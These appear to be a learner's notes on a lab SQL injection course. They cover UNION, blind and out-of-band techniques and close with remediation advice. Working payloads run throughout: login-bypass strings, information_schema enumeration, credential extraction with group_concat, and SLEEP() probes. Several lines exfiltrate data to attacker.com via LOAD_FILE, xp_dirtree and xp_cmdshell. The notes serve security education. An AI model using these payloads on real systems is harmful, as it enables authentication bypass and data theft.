## Task 2: SQL Essentials for Injection


### 1. SQL Comments

Comments tell the database to ignore part of the SQL query.

In MySQL:

- ``--`` → single-line comment
- ``#`` → single-line comment
- ``/* ... */`` → multi-line comment

Example:
````
SELECT * FROM users WHERE username='INPUT' AND password='secret';
````
If the input causes the remainder of the query to become a comment, the original password condition may no longer be processed.

#### Flow
````
SQL Query
   ↓
Input changes query
   ↓
Comment removes remaining SQL
````


Injecting ``admin'--`` as the username turns it into:
````
SELECT * FROM users WHERE username='admin'-- AND password='secret';
````
Everything after ``--`` is ignored, so the password check never runs.


---

### 2. UNION

``UNION`` combines the results of two ``SELECT`` statements.

Important rule:

> Both SELECT statements must return the same number of columns, with compatible data types.

Example:
````
SELECT name, age FROM students UNION SELECT username, id FROM admins;
````
Here, both queries return 2 columns.

#### Flow:
````
SELECT #1
   +
SELECT #2
   ↓
Combined result
````
This is the foundation of Union-Based SQL Injection.



### 3. LIKE and Wildcards

``LIKE`` is used for pattern matching.

Two important wildcards:

- ``%`` → matches any sequence of characters
`- ``_`` → matches exactly one character

Example:
````
SELECT * FROM users WHERE username LIKE 'adm%';
````
This can match usernames beginning with ``adm``, such as:
````
admin
administrator
````

#### Flow
````
LIKE 'adm%'
     ↓
Starts with "adm"
````


---


### 4. LIMIT

``LIMIT`` controls how many rows SQL returns.

Syntax:
````
LIMIT offset, count
````
Examples:
````
SELECT * FROM users LIMIT 1;
````
- Returns the first row.


````
SELECT * FROM users LIMIT 2, 1;
````
- Skips the first 2 rows and returns 1 row.

#### Flow:
````
LIMIT
  ↓
Control which rows / how many rows are returned
````

> **Note**: In injection payloads, ``LIMIT`` is often used to control which row is returned or to prevent the output from being overwhelmed by too many results.




### 5. String Functions

Two useful MySQL functions are:

- ``GROUP_CONCAT()``: Combines values from multiple rows into one string.

Example:
````
SELECT GROUP_CONCAT(username, ':', password SEPARATOR '<br>')
FROM users;
````
Instead of receiving values separately, multiple values can be combined into one result.

- ``CONCAT()``: Joins individual values together.

Example:
````
CONCAT(username, ':', password)
````
Could produce:
````
admin:pass123
````
Difference:
````
CONCAT()
   ↓
Combines values from one row
````
````
GROUP_CONCAT()
   ↓
Combines values from multiple rows
````

---



### 6. information_schema Database
``information_schema`` is a built-in database that stores information about the structure of a database.

MySQL, MariaDB, and PostgreSQL provide an ``information_schema`` database containing **metadata about databases**.

Think of it as a map of the database structure.

Important tables:
````
information_schema.tables
````
Lists tables.

Useful columns:
````
table_schema
table_name
````
``information_schema.columns``.


Two tables within information_schema are particularly valuable during SQL Injection:

- ``information_schema.tables``: lists every table. The ``table_schema`` column holds the database name, and ``table_name`` holds the table name.
- ``information_schema.columns``: lists every column. The ``table_name`` and ``column_name`` columns let we discover the structure of any table.


#### Flow:
````
information_schema
        ↓
   Database map
        ↓
 ┌───────────────┐
 │ tables        │ → Find tables
 │ columns       │ → Find columns
 └───────────────┘
 ````

## Task 3: What is SQL Injection?

**SQL Injection (SQLi)** happens when a web application puts user input directly into an SQL query without proper sanitisation or parameterisation.

The application accidentally treats the user's input as **SQL code instead of normal data**.




### How Web Applications Use SQL

Many websites get information from a database.

For example, a URL might contain:
````
https://website.thm/article?id=1
````
The application takes the id value and builds a query:
````
SELECT * FROM articles WHERE id = 1 AND public = 1;
````
The database returns article ``1`` if it is public, and the web server displays it.

#### Flow:
````
User
 ↓
?id=1
 ↓
Web Application
 ↓
SQL Query
 ↓
Database
 ↓
Result
````



### Where the Vulnerability Lives

The problem occurs when the application **directly concatenates user input** into the SQL query.

````
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
````
Then whatever we put in the ``id`` parameter becomes part of the SQL query. If you change the URL to ``?id=1 OR 1=1--``, the query becomes:

For example:
````
$ _GET['id']
````
is inserted directly into the query.

If the input changes the SQL logic, the resulting query can behave differently than the developer intended.

````
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
````

In the lab example, a condition such as:
````
OR 1=1
````
makes the condition logically true, while the comment syntax causes the remaining part of the original query to be ignored.

#### Flow:
````
Normal input
    ↓
SQL query works normally

Maliciously modified input
    ↓
SQL query logic changes
    ↓
SQL Injection
````




### Three Types of SQL Injection

**SQL Injection** is categorized by **how we receive feedback from the database**.

#### 1. In-Band SQL Injection

The database results come directly back through the web application's response.

It has two main types:

**Error-Based**:
- Database errors are displayed.
- Errors can reveal information about the database structure.

**Union-Based**:
- Uses UNION to combine another query with the original query.
- Data can appear directly in the page response.

````
SQL Injection
     ↓
Database
     ↓
Web Response
     ↓
Attacker sees result
````


#### 2. Blind SQL Injection

The application does not directly display database results or errors.

We have to infer information from indirect behavior.

**Authentication Bypass**: The login result changes depending on the injected SQL logic.

**Boolean-Based**: The response changes depending on whether a condition is true or false.

````
Condition
   ↓
True  → Response A
False → Response B
````


**Time-Based**:
- Uses a database delay function such as ``SLEEP()``.
- We observe whether the response becomes slower.
````
Condition
   ↓
True  → Delay
False → No delay
````

#### 3. Out-of-Band SQL Injection

The database makes an **external network request**, such as a DNS request.

The information is communicated through a separate channel rather than the normal web response.
````
Web Application
      ↓
   Database
      ↓
External Request
      ↓
Separate Channel
````
This is useful when **In-Band** and **Blind techniques are not practical**.


### Detecting SQL Injection

Before exploiting SQL Injection, we first need to find potential injection points.

Common locations include:
- URL parameters
- Form fields
- Login forms
- Search boxes
- Comment fields
- Cookies
- HTTP headers

A simple detection process is to test how the application reacts to SQL-related characters and conditions.


#### 1. Single quote
`- ``'``: If the application returns a database error, the input may be entering an SQL query unsafely.

#### 2. Double quote
- ``"``: Some queries use double quotes instead of single quotes.

#### 3. Comment syntax
`- ``--``: If the application's behavior changes, the database may be processing the comment syntax.

#### 4. Boolean condition
- ``OR 1=1``: If the application's response changes, the input may be affecting the SQL query's logic.

## Task 4: In-Band SQL Injection

**In-Band SQL Injection** is when the same communication channel is used to send the SQL Injection and receive the results.
````
Web Request
    ↓
SQL Injection
    ↓
Database
    ↓
Web Response
    ↓
Attacker sees result
````
It is commonly divided into **Error-Based** and **Union-Based SQL Injection**.




### Error-Based SQL Injection

**Error-Based SQLi** uses database error messages to learn information about the database.

For example, entering an unexpected quote into a vulnerable parameter may cause a SQL error.

````
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1
````

The error can reveal things such as:
- Database type
- SQL syntax
- Table information
- Query structure


#### Flow: 
````
Input
  ↓
SQL Error
  ↓
Information leaked
  ↓
Understand database structure
````

**Error-Based SQLi** is useful for **discovering database information**, while **Union-Based SQLi** can be used to retrieve larger amounts of data when the application displays query results.



### Union-Based SQL Injection

**Union-Based SQLi** uses the ``UNION`` operator to combine the original query with another ``SELECT`` query.

There is one critical requirement:

> Both ``SELECT`` statements must return the **same number of columns**.


The process in the lab has several steps.


#### Step 1: Determine the Number of Columns

Try increasing the number of columns until the query succeeds.
````
1 UNION SELECT 1
````
``Error → wrong number of columns``

Then:
````
1 UNION SELECT 1,2
````
``Error → still wrong``


Then:
````sql
1 UNION SELECT 1,2,3
````
``Success → 3 columns``

Main idea:
````
1 column  → Error
2 columns → Error
3 columns → Success
````
Therefore, the original query has 3 columns.



#### Step 2: Identify Which Columns Are Displayed

Not every database column is necessarily shown on the webpage.

Use values that make it easy to see which positions appear in the response.

Example:
````sql
0 UNION SELECT 1,2,3
````
If the page displays the value 3, then column position 3 is visible.
````
Column 1 → Not displayed
Column 2 → Not displayed
Column 3 → Displayed
````
That visible position can then be used for retrieving information in the lab.


#### Step 3: Extract the Database Name

Once we know a visible column position, use the MySQL database() function.

Example:
````sql
0 UNION SELECT 1,2,database()
````
This reveals the current database name.
````
database()
    ↓
Current database name
````


#### Step 4: Enumerate Tables

Use information_schema.tables to discover tables in the database.

Example:
````sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='database_name'
````


This returns the table names belonging to the selected database.
````
information_schema.tables
          ↓
      table_name
          ↓
   Find interesting tables
````


#### Step 5: Enumerate Columns

After identifying an interesting table, find its columns.

Example:
````sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='target_table'
````
This reveals the column names.
````
Target table
     ↓
information_schema.columns
     ↓
column_name
     ↓
Understand table structure
````



#### Step 6: Extract Data

Once we know the table and column names, the lab demonstrates extracting the relevant data.

Example:
````sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM target_table
````
This combines the selected values into a readable result.

Conceptually:
````
Database
   ↓
Database name
   ↓
Tables
   ↓
Columns
   ↓
Data
````



### Why Each Step Works
#### Column count must match

- ``UNION`` requires both queries to return the same number of columns.

````
Original query → 3 columns
Injected query → 3 columns
                  ↓
                Works
````
#### Why use 0 or -1?

The lab uses a value such as 0 or -1 so the original query returns no normal result, making the injected result easier to see.

#### Why use information_schema?

``information_schema`` contains metadata describing the database structure:
````
information_schema
       ├── tables
       │     ├── table_schema
       │     └── table_name
       │
       └── columns
             ├── table_name
             └── column_name
````

## Task 5: Blind SQL Injection — Authentication Bypass

**Blind SQL Injection** happens when the application does not show database results or SQL errors directly.

Instead, we determine whether the injection worked by observing the application's **behaviour**.

Examples of behaviour:

* Did we get logged in?
* Did the page content change?
* Did the response take longer?

---

### What Makes It "Blind"?

With normal SQLi, you may directly see database information.

With Blind SQLi:

```
Input
  ↓
Database processes it
  ↓
No database output shown
  ↓
Observe application behaviour
```

**Authentication bypass** is a simple example because you only need to observe:

```
Login successful
       OR
Login failed
```

---

### How Authentication Queries Work

A typical login might create a query like:

```sql
SELECT * FROM users
WHERE username='bob'
AND password='secret123'
LIMIT 1;
```

The application checks whether the query returns a row.

```
Row returned
    ↓
Credentials accepted
    ↓
Logged in

No row
    ↓
Login fails
```

The actual database result is not shown to the user.

---

### The Authentication Bypass Concept

The important idea is that an attacker does not necessarily need to know the valid password.

In the **lab**, the supplied username input changes the SQL logic so that the condition becomes true, while the remaining password check is commented out.

Conceptually:

```
Original query
     ↓
username + password checked
```

becomes:

```
Modified query
     ↓
Condition becomes TRUE
     ↓
Password check is ignored
     ↓
A user row is returned
     ↓
Application logs in
```

#### Breaking it down

* The username portion changes the `WHERE` condition.
* A true condition causes the query to match.
* SQL comment syntax removes the remaining password condition.
* The database returns a row.
* The application interprets the returned row as a successful login.

---

### Targeting a Specific User

Sometimes you want to target a particular account rather than whichever user happens to be returned first.

In the lab, the example targets the **admin** username.

Conceptually:

```
Target username
      ↓
SQL condition matches that user
      ↓
Password condition is commented out
      ↓
Admin row returned
      ↓
Logged in as that account
```

The important concept is:

**Authentication bypass does not require knowing the password when the SQL query can be manipulated to ignore the password check.**

---

### Variations

The exact syntax depends on how the application constructs its SQL query.

Common variations demonstrated by the lesson include:

* A classic **OR true-condition + comment** pattern for inputs wrapped in single quotes.
* A variant using `#` as the MySQL comment character.
* A variant for queries that use **double quotes** around input.
* Testing both the **username and password fields**, because applications may build their queries differently.

The key principle is always:

```
Change SQL logic
      ↓
Make authentication condition true
      ↓
Comment/neutralize remaining condition
      ↓
Observe login result
```

---

### Detection in the Field

During an authorized penetration test, login forms are important places to check for SQL Injection.

Look at:

* Username fields
* Password fields
* Login parameters
* Other inputs that interact with the database

If the application behaves differently after a SQL-related test input, that can indicate that the input is reaching the SQL query.


The practical task mentioned in the lesson provides a **SQL Query box**.

This lets we directly see how the application places the username and password inside the `WHERE` clause.

For example:

```text
WHERE
username = 'USER_INPUT'
AND
password = 'PASSWORD_INPUT'
```

This makes it easier to understand **exactly where the input enters the SQL query**.

## Task6: Blind SQL Injection — Boolean-Based and Time-Based

This task explains how to extract information when the application **does not directly display database results or errors**.

There are two main techniques:

1. **Boolean-Based Blind SQLi** → use `true/false` responses.
2. **Time-Based Blind SQLi** → use response delays.

The examples below follow the **TryHackMe lab shown in your screenshots**.

---

### 1. Boolean-Based Blind SQL Injection

In Boolean-Based Blind SQLi, the application gives you a **true/false signal**.

For example:

```text
username=admin
        ↓
{"taken":true}
```

But:

```text
username=admin123
        ↓
{"taken":false}
```

The response itself becomes our information channel.

### Basic idea

```text
SQL condition
     ↓
 ┌───┴────┐
True     False
 ↓         ↓
Response A Response B
```

---

### The vulnerable query

The lab gives an example where the backend may construct:

```sql
SELECT * FROM users
WHERE username = '%username%'
LIMIT 1;
```

The `%username%` represents the value supplied by the user.

If that input can alter the SQL query, we can test conditions and observe the response.

---

#### Step 1: Confirm the Injection

The lab uses this test:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

The important part is:

```sql
WHERE database() LIKE '%'
```

`%` matches any sequence of characters, so the condition should evaluate as **true**.

If the application responds with:

```json
{"taken":true}
```

then the injection is working.

#### Flow

```text
Injection
   ↓
database() LIKE '%'
   ↓
TRUE
   ↓
{"taken":true}
```

---

#### Step 2: Find the Database Name

Now replace `%` with a specific character.

For example:

```sql
admin123' UNION SELECT 1,2,3
WHERE database() LIKE 'a%';--
```

This asks:

```text
Does the database name start with "a"?
```

If:

```json
{"taken":true}
```

then the condition is true.

If:

```json
{"taken":false}
```

then it is false.

We can test different characters:

```text
a%
b%
c%
d%
...
```

Once you find the first character, test the second character:

```text
aa%
ab%
ac%
...
```

Then continue:

```text
First character
      ↓
Second character
      ↓
Third character
      ↓
...
      ↓
Full database name
```

---

#### Step 3: Find Table Names

Once the database name is known, the same technique can be applied to `information_schema`.

The lab example uses:

```sql
admin123' UNION SELECT 1,2,3
FROM information_schema.tables
WHERE table_schema = 'db_name'
AND table_name LIKE 'a%';--
```

The important table is:

```text
information_schema.tables
```

It contains metadata about tables.

The relevant fields are:

```text
table_schema
table_name
```

Conceptually:

```text
information_schema.tables
          ↓
      table_schema
          ↓
       db_name
          ↓
       table_name
```

You can then test table names character-by-character using `LIKE`.

---

# Step 4: Find Column Names

After finding an interesting table, use:

```text
information_schema.columns
```

The lab applies the same character-by-character technique to find column names.

The important fields are:

```text
table_name
column_name
```

Conceptually:

```text
Target table
     ↓
information_schema.columns
     ↓
column_name
     ↓
Find interesting columns
```

---

#### Step 5: Extract Data

Once you know the table and column names, the lab demonstrates using `GROUP_CONCAT()` to combine values into a readable response.

Example from the lab:

```sql
admin123' UNION SELECT 1,2,3,
FROM target_table
```

The exact extraction query depends on the number of columns and the target table structure established in the earlier steps.

The overall process is:

```text
Injection
   ↓
Confirm TRUE response
   ↓
Database name
   ↓
Table names
   ↓
Column names
   ↓
Relevant data
```

---

### 2. Time-Based Blind SQL Injection

Time-Based Blind SQLi is useful when the application gives **no useful visible difference**.

The page may look exactly the same whether the condition is true or false.

Instead, we watch the **response time**.

```text
Condition
    ↓
 ┌───┴────┐
True     False
 ↓         ↓
Delay     Normal
```

---

### MySQL `SLEEP()`

MySQL provides:

```sql
SLEEP()
```

which pauses execution for a specified number of seconds.

The lab demonstrates:

```sql
admin123' UNION SELECT SLEEP(5),2
WHERE database() LIKE '%s%';--
```

The idea is:

```text
database() LIKE '%s%'
        ↓
     TRUE?
    /     \
  Yes      No
   ↓        ↓
SLEEP(5)  No delay
```

If the database name satisfies the condition, the response should take approximately **5 seconds longer**.

---

### Step 1: Find the Column Count

The same principle used in Union-Based SQLi applies here.

The lab first tries:

```sql
admin123' UNION SELECT SLEEP(5);--
```

If the column count is wrong:

```text
No useful delay
```

Then:

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

If this matches the required number of columns:

```text
Approximately 5-second delay
```

So you can determine the correct column count.

```text
1 column
   ↓
Wrong

2 columns
   ↓
Correct
   ↓
~5 second delay
```

---

# Step 2: Enumerate Data

Once the time-based test works, use the same character-by-character method as Boolean-Based SQLi.

The difference is the signal.

### Boolean-Based

```text
TRUE  → {"taken":true}
FALSE → {"taken":false}
```

### Time-Based

```text
TRUE  → Delay
FALSE → No delay
```

For example, you can conceptually ask:

```text
Does the database name start with "s"?
```

Then:

```text
TRUE  → response delayed
FALSE → response normal
```

Continue character-by-character until the required value is reconstructed.

---

# Network Latency Warning

Time-Based SQLi is more difficult because normal network latency can look like a database delay.

For example:

```text
Normal request → 0.3 sec
Slow network   → 1.0 sec
SQL delay      → 5.0 sec
```

A small natural delay should not automatically be interpreted as `SLEEP()` executing.

For the lab:

* Use a noticeable delay.
* Test important characters more than once.
* Compare with the normal response time.

---

# Boolean-Based vs Time-Based

| Feature                                   | Boolean-Based                         | Time-Based       |
| ----------------------------------------- | ------------------------------------- | ---------------- |
| **Signal**                                | Response content                      | Response time    |
| **TRUE**                                  | Different/positive response           | Delayed response |
| **FALSE**                                 | Different/negative response           | Normal response  |
| **Requires visible response difference?** | Yes                                   | No               |
| **Typical example**                       | `{"taken":true}` vs `false`           | ~5 sec vs normal |
| **Speed**                                 | Usually faster                        | Usually slower   |
| **Main difficulty**                       | Finding reliable true/false responses | Network latency  |

---

# When to Use Which

| Situation                                            | Technique         |
| ---------------------------------------------------- | ----------------- |
| Application gives different responses for TRUE/FALSE | **Boolean-Based** |
| Application responses look identical                 | **Time-Based**    |
| Time-based testing is blocked/unreliable             | **Out-of-Band**   |

## # Out-of-Band (OOB) SQL Injection

**OOB SQL Injection** is used when the normal methods do not work.

Instead of getting data back in the web page, you make the **database server connect to another server** and send information through that connection.

```text
Normal SQLi:
Attacker → Website → Database → Website → Attacker

OOB SQLi:
Attacker → Website → Database
                    ↓
              External Server
```

## When do we use OOB?

OOB can be useful when:

* **In-Band doesn't work** → no database results or errors are displayed.
* **Boolean-Based doesn't work** → responses look the same.
* **Time-Based doesn't work** → delays are unreliable or blocked.
* The database server **can make outbound connections**.

If the database cannot make outbound connections, OOB will not work.

---

## How OOB Works

There are **two channels**:

### 1. Attack channel

This is our normal web request.

```text
Attacker
   ↓
Web application
   ↓
Database
```

### 2. Data channel

The database makes an external **DNS or HTTP request**.

```text
Database
    ↓
DNS / HTTP
    ↓
Your listener
```

The important idea is:

**The SQL query triggers the database to make an external request.**

---

### DNS Exfiltration with MySQL

The lesson shows a MySQL technique using `LOAD_FILE()` to trigger a DNS lookup.

The example is:

```sql
SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT database()),
    '.attacker.com\\share'));
```

#### What happens?

Suppose:

```text
database() = webapp_db
```

Then `CONCAT()` builds a path containing:

```text
webapp_db.attacker.com
```

The database attempts to access that path, causing a DNS lookup.

```text
database()
    ↓
webapp_db
    ↓
webapp_db.attacker.com
    ↓
DNS lookup
    ↓
Your DNS server
```

Our listener can then see the request and the **subdomain contains the value**.

This technique is particularly associated with **Windows-based MySQL servers where UNC paths trigger DNS resolution**.

---

### MSSQL Techniques

Microsoft SQL Server has stored procedures that can be useful for OOB testing.

#### `xp_dirtree`

`xp_dirtree` can cause SQL Server to access a remote directory.

Example from the lesson:

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

Conceptually:

```text
MSSQL Server
     ↓
Remote directory
     ↓
DNS / network request
     ↓
Our server
```

---

#### `xp_cmdshell`

If `xp_cmdshell` is enabled, SQL Server can execute operating-system commands.

The lesson gives an example using `nslookup`:

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

This causes the server to perform a DNS lookup.

**Important:** `xp_cmdshell` is normally disabled on modern MSSQL installations, while `xp_dirtree` may still be available.

---

### Receiving the Data

We need something listening for the database's outbound request.

### Burp Collaborator

Provides a unique domain and records DNS/HTTP callbacks.

```text
SQL Server
    ↓
Collaborator domain
    ↓
DNS/HTTP callback
    ↓
Burp Collaborator
```

#### Interactsh

An alternative that can be self-hosted and can record interactions.

#### Custom Listener

We can also use your own DNS or HTTP listener when you need more control.

---

### Limitations

OOB SQLi has several important limitations:

| Limitation            | Meaning                                                           |
| --------------------- | ----------------------------------------------------------------- |
| **Outbound access**   | Database server must be able to make external network connections |
| **Firewall**          | Outbound traffic may be blocked                                   |
| **Database-specific** | MySQL, MSSQL, PostgreSQL, etc. use different techniques           |
| **DNS size limit**    | DNS subdomain labels have limited length                          |
| **Slower**            | OOB can be slower than directly receiving results                 |
| **Less reliable**     | Network/DNS issues can cause missed callbacks                     |

---

# Easy Comparison

| SQLi Type         | How you receive information    |
| ----------------- | ------------------------------ |
| **In-Band**       | Directly in the web response   |
| **Boolean-Based** | Different response: TRUE/FALSE |
| **Time-Based**    | Different response time        |
| **Out-of-Band**   | External DNS/HTTP request      |

## Task 8: Remediation and Prevention

Knowing how to exploit SQL Injection is important, but knowing **how to fix it** is just as important.

The main defenses are:

---

### 1. Prepared Statements (Parameterized Queries)

**Prepared statements are the primary defense against SQL Injection.**

They separate:
```text
SQL code
   +
User data
```

The user input is treated as **data**, not executable SQL.

#### Vulnerable PHP

```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

The user input is directly added to the SQL query.

```text
User input
    ↓
SQL string
    ↓
Database
```

This can allow the input to change the SQL query structure.

#### Fixed PHP — PDO

```php
$stmt = $pdo->prepare(
    "SELECT * FROM users WHERE username = ?"
);

$stmt->execute([
    $_POST['username']
]);

$result = $stmt->fetchAll();
```

Here, `?` is a **placeholder**.

Whatever the user enters is treated as a string value rather than SQL code.

```text
SQL structure
      +
      ?
      ↓
User input
      ↓
Treated as DATA
```

---

### 2. Python Parameterized Queries

#### Vulnerable Python

```python
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

The username is directly inserted into the query.

#### Fixed Python

```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s",
    (username,)
)
```

`%s` is the parameter placeholder.

The database connector handles the escaping and parameter binding.

#### Main idea

```text
Vulnerable:
User input → SQL string

Safe:
SQL template + parameter
              ↓
          Database
```

**Prepared statements should be the primary defense.**

---

### 3. Input Validation

Input validation controls what the application accepts **before the value reaches the database**.

The preferred approach is **allowlisting**.

That means:

> Define exactly what is valid and reject everything else.

For example, if an `id` should only contain numbers:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

This accepts numeric values and rejects other formats.

> **Note**: Do **not** rely on validation alone.

Use:

```text
Input validation
       +
Prepared statements
       ↓
Stronger protection
```

Blocklists are weak because attackers can potentially find alternative syntax or encoding.

---

### 4. Escaping User Input

Escaping means adding special handling so characters are treated as **literal data instead of SQL syntax**.

For example, a quote can be escaped so the database treats it as part of the value.

Escaping can help with older applications, but it is **not the preferred solution**.

#### Why?

* Different database engines have different escaping rules.
* It can be implemented incorrectly.
* It is less robust than parameterized queries.

Therefore:

```text
Prepared Statements
        ↓
Preferred

Escaping
        ↓
Last resort / legacy systems
```

---

### 5. Principle of Least Privilege

Even with good input handling, use **defense in depth**.

The database account used by the web application should have only the permissions it actually needs.

### Example

If an application only needs to read data:

```text
Database account
      ↓
SELECT only
```

It should not have unnecessary permissions such as:

```text
DROP
DELETE
Administrative access
System-level privileges
```

### Important rules

* Use **read-only** accounts when possible.
* Never connect the application as **root** or **sa**.
* Restrict access to sensitive tables.
* Give each application only the permissions it requires.

If SQL Injection occurs through a low-privilege account, the damage can be greatly reduced.

---

### 6. Web Application Firewalls (WAFs)

A **WAF** examines incoming web requests and can block known malicious patterns.

Conceptually:

```text
Attacker Request
       ↓
      WAF
       ↓
 ┌─────┴─────┐
 │           │
Allowed    Blocked
 ↓           ↓
Application  Stop
```

A WAF may detect suspicious SQL Injection patterns.

However:

> A WAF should **not** replace secure application code.

Attackers can sometimes bypass pattern-based filtering using different encodings or syntax.

Therefore, think of a WAF as an **additional security layer**, not the primary SQLi defense.

## Task 10: Conclusion 

### Summary

This room covered the main types of **SQL Injection** and how attackers can exploit vulnerable applications.

* **In-Band SQLi:** Error-Based and Union-Based extraction
* **Blind SQLi:** Authentication Bypass, Boolean-Based, and Time-Based
* **Out-of-Band SQLi:** DNS/HTTP-based data extraction
* Learned how attackers identify SQL injection points and retrieve database information.
* Used `UNION`, `LIKE`, comments, and `information_schema` during exploitation.
* Learned how Blind SQLi can extract information **character-by-character**.
* Learned defensive techniques:

  * **Prepared statements**
  * **Input validation**
  * **Least privilege**

**Main takeaway:** SQL Injection happens when untrusted user input is improperly included in SQL queries. Using parameterized/prepared queries and proper input handling is the primary defense.
